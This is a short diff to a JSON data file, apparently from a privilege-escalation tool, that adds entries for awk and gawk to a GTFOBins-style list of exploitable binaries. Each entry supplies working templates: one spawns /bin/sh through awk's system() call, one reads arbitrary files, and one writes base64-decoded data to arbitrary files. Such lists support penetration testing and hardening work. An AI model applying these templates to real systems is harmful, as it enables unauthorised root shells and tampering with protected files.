@@ -58,6 +58,28 @@
 		"command": "{path} -p -c {command}"
 	},
 	{
+		"name": "awk",
+		"shell": {
+			"script": "{command} 'BEGIN {{system(\"/bin/sh\")}}'"
+		},
+		"read_file": "{path} '//' {lfile}",
+		"write_file": {
+			"type": "base64",
+			"payload": "{path} -v LFILE={lfile} 'BEGIN {{ \"echo \\\"{data}\\\" | base64 -d\" | getline x ; print x > LFILE }}'"
+		}
+	},
+	{
+		"name": "gawk",
+		"shell": {
+			"script": "{command} 'BEGIN {{system(\"/bin/sh\")}}'"
+		},
+		"read_file": "{path} '//' {lfile}",
+		"write_file": {
+			"type": "base64",
+			"payload": "{path} -v LFILE={lfile} 'BEGIN {{ \"echo \\\"{data}\\\" | base64 -d\" | getline x ; print x > LFILE }}'"
+		}
+	},
+	{
 		"name": "dash",
 		"shell": {
 			"script": "{command}", 
